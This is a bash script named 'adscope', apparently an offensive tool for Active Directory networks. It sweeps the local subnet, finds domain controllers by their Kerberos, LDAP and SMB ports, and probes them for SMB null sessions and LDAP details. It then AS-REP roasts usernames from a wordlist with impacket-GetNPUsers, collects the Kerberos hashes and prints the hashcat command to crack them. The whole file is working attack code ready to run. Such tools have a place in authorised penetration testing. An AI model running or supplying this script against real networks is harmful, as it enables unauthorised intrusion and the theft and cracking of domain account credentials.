#!/bin/bash

# ============================================================
# adscope - Active Directory Recon
# ============================================================

banner() {
    cat << "EOF"
    ___    ____  _____                  
   /   |  / __ \/ ___/_________  ____  
  / /| | / / / /\__ \/ ___/ __ \/ __ \ 
 / ___ |/ /_/ /___/ / /__/ /_/ / /_/ / 
/_/  |_/_____//____/\___/\____/ .___/  
                             /_/       
        Active Directory Recon
EOF
    echo "        v1.0 | $(date +%Y-%m-%d)"
    echo
}

# ------------------------------------------------------------
# Interface selection
# ------------------------------------------------------------
select_interface() {
    mapfile -t IFACES < <(
        ip -o -4 addr show \
          | awk '$2 !~ /^(lo|docker|virbr|veth|tap|br-)/ {print $2}' \
          | sort -u
    )

    if [[ ${#IFACES[@]} -eq 0 ]]; then
        echo "[!] No usable IPv4 interfaces found." >&2
        exit 1
    fi

    if [[ -n "$1" ]]; then
        for i in "${IFACES[@]}"; do
            [[ "$i" == "$1" ]] && { echo "$i"; return 0; }
        done
        echo "[!] Interface '$1' not found." >&2
        exit 1
    fi

    if [[ ! -t 0 ]]; then
        echo "${IFACES[0]}"
        return 0
    fi

    echo "[*] Available interfaces:" >&2
    local idx=1
    for i in "${IFACES[@]}"; do
        local cidr
        cidr=$(ip -o -4 addr show "$i" | awk '{print $4; exit}')
        printf "    %d) %-12s %s\n" "$idx" "$i" "$cidr" >&2
        ((idx++))
    done

    local choice
    while :; do
        read -rp "[?] Select interface [1-${#IFACES[@]}]: " choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#IFACES[@]} )); then
            echo "${IFACES[$((choice-1))]}"
            return 0
        fi
        echo "    [!] Invalid selection." >&2
    done
}

# ------------------------------------------------------------
# CIDR derivation from interface
# ------------------------------------------------------------
cidr_for_iface() {
    local iface="$1" cidr ip mask a b c d net
    cidr=$(ip -o -4 addr show "$iface" | awk '{print $4; exit}')
    [[ -z "$cidr" ]] && return 1

    ip="${cidr%/*}"
    mask="${cidr#*/}"
    IFS=. read -r a b c d <<< "$ip"
    net=$(( (a<<24 | b<<16 | c<<8 | d) & (~0 << (32-mask)) ))
    printf "%d.%d.%d.%d/%d\n" \
      $((net>>24 & 255)) $((net>>16 & 255)) \
      $((net>>8 & 255)) $((net & 255)) "$mask"
}

# ------------------------------------------------------------
# Phase 1: Sweep subnet, split into confirmed + candidates
# ------------------------------------------------------------
sweep_subnet() {
    local subnet="$1" confirmed="$2" candidates="$3"

    echo "[*] Sweeping $subnet with fping..." >&2
    fping -a -q -g "$subnet" 2>/dev/null | sort -u > /tmp/adscope_fping.txt

    sleep 1

    echo "[*] Reading ARP cache..." >&2
    ip neigh show \
      | awk '$1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $6 != "FAILED" && $6 != "INCOMPLETE" {print $1}' \
      | sort -u > /tmp/adscope_arp.txt

    comm -12 /tmp/adscope_fping.txt /tmp/adscope_arp.txt > "$confirmed"
    comm -13 /tmp/adscope_fping.txt /tmp/adscope_arp.txt > "$candidates"

    local fping_count arp_count conf_count cand_count
    fping_count=$(wc -l < /tmp/adscope_fping.txt)
    arp_count=$(wc -l < /tmp/adscope_arp.txt)
    conf_count=$(wc -l < "$confirmed")
    cand_count=$(wc -l < "$candidates")

    echo "[*] fping returned:        $fping_count" >&2
    echo "[*] ARP cache had:         $arp_count" >&2
    echo "[*] Confirmed live:        $conf_count" >&2
    echo "[*] ARP-only candidates:   $cand_count" >&2
}

# ------------------------------------------------------------
# Phase 2: Identify DC candidates by port signature
# ------------------------------------------------------------
find_dcs() {
    local infile="$1" outfile="$2"
    local gnmap="/tmp/adscope_dc_scan.gnmap"

    if [[ ! -s "$infile" ]]; then
        echo "[!] No live hosts to scan." >&2
        return 1
    fi

    echo "[*] Scanning for DC ports (88, 389, 445)..." >&2
    nmap -Pn -n -T4 --open -p 88,389,445 -iL "$infile" -oG "$gnmap" >/dev/null 2>&1

    awk '/Ports:/ && /88\/open/ && /389\/open/ && /445\/open/ {print $2}' \
        "$gnmap" | sort -u > "$outfile"

    local count
    count=$(wc -l < "$outfile")
    if (( count == 0 )); then
        echo "[!] No DC candidates found." >&2
        return 1
    fi

    echo "[*] DC candidates: $count" >&2
    while read -r dc; do
        echo "    -> $dc" >&2
    done < "$outfile"
}

# ------------------------------------------------------------
# Phase 3: DC recon — RootDSE, SMB null session
# ------------------------------------------------------------
recon_dc() {
    local dc="$1"
    local outdir="recon_${dc//./_}"
    mkdir -p "$outdir"

    echo "[*] === Recon on $dc ===" >&2

    # 1. TCP RootDSE — naming context
    echo "[*] TCP RootDSE query..." >&2
    local base_dn
    base_dn=$(ldapsearch -x -LLL -H "ldap://$dc" -s base -b "" namingContexts 2>/dev/null \
        | awk -F': ' '/^namingContexts:/ {print $2; exit}')
    if [[ -n "$base_dn" ]]; then
        echo "[+] Naming context: $base_dn" >&2
        echo "$base_dn" > "$outdir/base_dn.txt"
    else
        echo "[-] Could not retrieve naming context." >&2
    fi

    # 2. SMB null session check
    echo "[*] SMB null session check..." >&2
    nxc smb "$dc" -u '' -p '' 2>&1 | tee "$outdir/smb_null.txt" >&2

    # 3. LDAP signing check
    echo "[*] LDAP signing check..." >&2
    local signing
    signing=$(nmap -p 389 --script ldap-rootdse "$dc" 2>/dev/null \
        | grep -i "signing" | head -1)
    if [[ -n "$signing" ]]; then
        echo "    $signing" >&2
    else
        echo "    (no explicit signing info in rootDSE)" >&2
    fi

    echo "[*] Results saved to $outdir/" >&2
}

# ------------------------------------------------------------
# Phase 4: AS-REP roasting with casing sweep
# ------------------------------------------------------------
asrep_roast() {
    local dc="$1"
    local domain="$2"
    local wordlist="$3"
    local outdir="recon_${dc//./_}"
    local combined="$outdir/asrep_all.hashes"

    if [[ ! -f "$wordlist" ]]; then
        echo "[!] Wordlist not found: $wordlist" >&2
        return 1
    fi

    if [[ -z "$domain" ]]; then
        echo "[!] Domain unknown — cannot AS-REP roast." >&2
        return 1
    fi

    if ! command -v impacket-GetNPUsers >/dev/null 2>&1; then
        echo "[!] impacket-GetNPUsers not found (install impacket)." >&2
        return 1
    fi

    echo "[*] === AS-REP roasting $domain ===" >&2

    # Build casing variants
    awk '{print tolower($0)}' "$wordlist" > /tmp/adscope_users_lower.txt
    awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}' "$wordlist" > /tmp/adscope_users_title.txt
    awk '{print toupper($0)}' "$wordlist" > /tmp/adscope_users_upper.txt

    : > "$combined"

    local variant hashfile count total
    total=0
    for variant in lower title upper; do
        hashfile="$outdir/asrep_${variant}.hashes"
        echo "[*] Trying $variant-cased usernames..." >&2

        impacket-GetNPUsers "${domain}/" \
            -usersfile "/tmp/adscope_users_${variant}.txt" \
            -no-pass \
            -dc-ip "$dc" \
            -format hashcat \
            -outputfile "$hashfile" 2>/dev/null

        if [[ -s "$hashfile" ]]; then
            count=$(grep -c '^\$krb5asrep\$' "$hashfile" 2>/dev/null || echo 0)
            total=$(( total + count ))
            echo "[+] $variant: $count hash(es)" >&2
            cat "$hashfile" >> "$combined"
        else
            echo "[-] $variant: 0 hashes" >&2
        fi
    done

    # Deduplicate
    if [[ -s "$combined" ]]; then
        sort -u "$combined" -o "$combined"
        echo "[+] Total unique AS-REP hashes: $(grep -c '^\$krb5asrep\$' "$combined")" >&2
        echo "[+] Hashes saved to $combined" >&2
        echo "[*] Crack with: hashcat -m 18200 $combined <wordlist>" >&2
    else
        echo "[-] No AS-REP roastable accounts found." >&2
    fi
}

# ------------------------------------------------------------
# Main
# ------------------------------------------------------------
banner

# Dependency check
for cmd in fping nmap ip awk comm sort ldapsearch; do
    command -v "$cmd" >/dev/null || { echo "[!] Missing dependency: $cmd"; exit 1; }
done

# Optional tools — warn but don't exit
for opt in nxc impacket-GetNPUsers; do
    command -v "$opt" >/dev/null || echo "[!] Optional tool missing: $opt (some checks will be skipped)" >&2
done

# Arg parsing
IFACE_ARG=""
WORDLIST=""
while getopts "i:w:h" opt; do
    case "$opt" in
        i) IFACE_ARG="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        h)
            cat <<EOF
Usage: $0 [-i <interface>] [-w <wordlist>]

  -i <iface>     Network interface to use (skips interactive prompt)
  -w <wordlist>  Username wordlist for AS-REP roasting
                 (default: /usr/share/seclists/Usernames/top-usernames-shortlist.txt)
EOF
            exit 0
            ;;
        *) exit 1 ;;
    esac
done

# Default wordlist if not supplied
if [[ -z "$WORDLIST" ]]; then
    for candidate in \
        /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
        /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt \
        /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
    do
        if [[ -f "$candidate" ]]; then
            WORDLIST="$candidate"
            break
        fi
    done
fi

if [[ -z "$WORDLIST" ]]; then
    echo "[!] No wordlist found. Use -w to specify one." >&2
    echo "[!] AS-REP roasting will be skipped." >&2
fi

# Interface + subnet
IFACE=$(select_interface "$IFACE_ARG")
SUBNET=$(cidr_for_iface "$IFACE") || { echo "[!] Could not derive CIDR."; exit 1; }

echo "[*] Interface : $IFACE"
echo "[*] Subnet    : $SUBNET"
[[ -n "$WORDLIST" ]] && echo "[*] Wordlist  : $WORDLIST"
echo

# Phase 1
sweep_subnet "$SUBNET" "live_confirmed.txt" "live_candidates.txt"
echo "[*] Confirmed written to live_confirmed.txt"
echo "[*] Candidates written to live_candidates.txt"
echo

# Merge for scanning
cat live_confirmed.txt live_candidates.txt 2>/dev/null | sort -u > scan_targets.txt

# Exclude our own IP
MY_IP=$(ip -o -4 addr show "$IFACE" | awk '{print $4}' | cut -d/ -f1)
grep -v "^${MY_IP}$" scan_targets.txt > scan_targets.tmp && mv scan_targets.tmp scan_targets.txt

echo "[*] Scan targets (after exclusions): $(wc -l < scan_targets.txt)"
echo

# Phase 2
if find_dcs "scan_targets.txt" "dc_candidates.txt"; then
    echo "[*] DC candidates written to dc_candidates.txt"
    echo

    # Extract domain from first DC
    FIRST_DC=$(head -1 dc_candidates.txt)
    DOMAIN=$(ldapsearch -x -LLL -H "ldap://$FIRST_DC" -s base -b "" namingContexts 2>/dev/null \
        | awk -F': ' '/^namingContexts:/ {print $2; exit}' \
        | sed -E 's/^DC=//I; s/,DC=/./gI')

    echo "[*] Detected domain: ${DOMAIN:-unknown}"
    echo

    # Phase 3 per DC
    while read -r dc; do
        recon_dc "$dc"
        echo
    done < dc_candidates.txt

    # Phase 4 — AS-REP roast against the first DC
    if [[ -n "$WORDLIST" ]] && [[ -n "$DOMAIN" ]]; then
        asrep_roast "$FIRST_DC" "$DOMAIN" "$WORDLIST"
        echo
    fi
else
    echo "[!] No DCs identified. Stopping here."
    exit 1
fi
